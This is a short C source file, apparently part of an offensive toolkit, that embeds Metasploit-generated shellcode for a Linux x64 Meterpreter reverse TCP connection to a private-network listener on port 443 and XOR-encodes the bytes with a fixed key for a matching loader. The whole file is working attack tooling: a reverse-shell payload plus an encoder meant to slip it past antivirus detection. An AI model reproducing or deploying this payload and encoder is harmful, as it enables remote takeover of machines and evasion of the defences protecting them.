#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

//Shellcode
// msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.x.120 lport=443 -f c
unsigned char buf[] = 
"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\xb7\xd0\xb5\xb8\xf4\x90\x39\x33\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xdd\xf9\xed\x21\x9e\x92"
"\x66\x59\xb6\x8e\xba\xbd\xbc\x07\x71\x8a\xb5\xd0\xb4\x03\xfe"
"\x9a\x39\xb3\xe6\x98\x3c\x5e\x9e\x80\x63\x59\x9d\x88\xba\xbd"
"\x9e\x93\x67\x7b\x48\x1e\xdf\x99\xac\x9f\x3c\x46\x41\xba\x8e"
"\xe0\x6d\xd8\x82\x1c\xd5\xb9\xdb\x97\x87\xf8\x39\x60\xff\x59"
"\x52\xea\xa3\xd8\xb0\xd5\xb8\xd5\xb5\xb8\xf4\x90\x39\x33";

int main (int argc, char **argv)
{
        // Xor encryption value has to match the loader one
        char xor_key = 'J';
        int payload_length = (int) sizeof(buf);

        for (int i=0; i<payload_length; i++)
        {
                printf("\\x%02X", buf[i] ^ xor_key);
        }

        return 0;
}
